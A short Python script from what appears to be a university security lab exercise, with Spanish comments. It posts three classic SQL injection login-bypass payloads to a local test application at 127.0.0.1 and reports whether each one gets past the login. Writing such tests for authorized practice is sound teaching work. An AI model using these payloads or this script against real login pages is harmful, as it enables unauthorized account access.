
import requests

# Práctica Experimental 4 - Seguridad Informática
# Pruebas de SQL Injection en una aplicación local autorizada.

URL = "http://127.0.0.1:5000/login"

payloads = [
    "admin' --",
    "' OR '1'='1",
    "x' OR '1'='1' --"
]

print("PRUEBAS AUTOMATIZADAS DE SQL INJECTION")
print("-" * 50)

for numero, payload in enumerate(payloads, start=1):
    datos = {
        "username": payload,
        "password": "password123"
    }

    print(f"\nPrueba {numero}")
    print(f"Payload: {payload}")

    try:
        respuesta = requests.post(
            URL,
            data=datos,
            timeout=10
        )

        print(f"Codigo HTTP: {respuesta.status_code}")

        if respuesta.status_code != 200:
            print("Resultado: Respuesta HTTP inesperada")
        elif "Acceso concedido" in respuesta.text:
            print("Resultado: ACCESO CONCEDIDO")
            print("El payload consiguio superar el login.")
        elif "Usuario o contraseña incorrectos" in respuesta.text:
            print("Resultado: ACCESO RECHAZADO")
            print("El payload no consiguio superar el login.")
        elif "Error en la consulta SQL" in respuesta.text:
            print("Resultado: ERROR SQL")
            print("La consulta produjo un error.")
        else:
            print("Resultado: NO DETERMINADO")
            print("Revisar manualmente la respuesta.")

    except requests.exceptions.RequestException as error:
        print(f"Error de conexion: {error}")

print("\nPruebas finalizadas.")
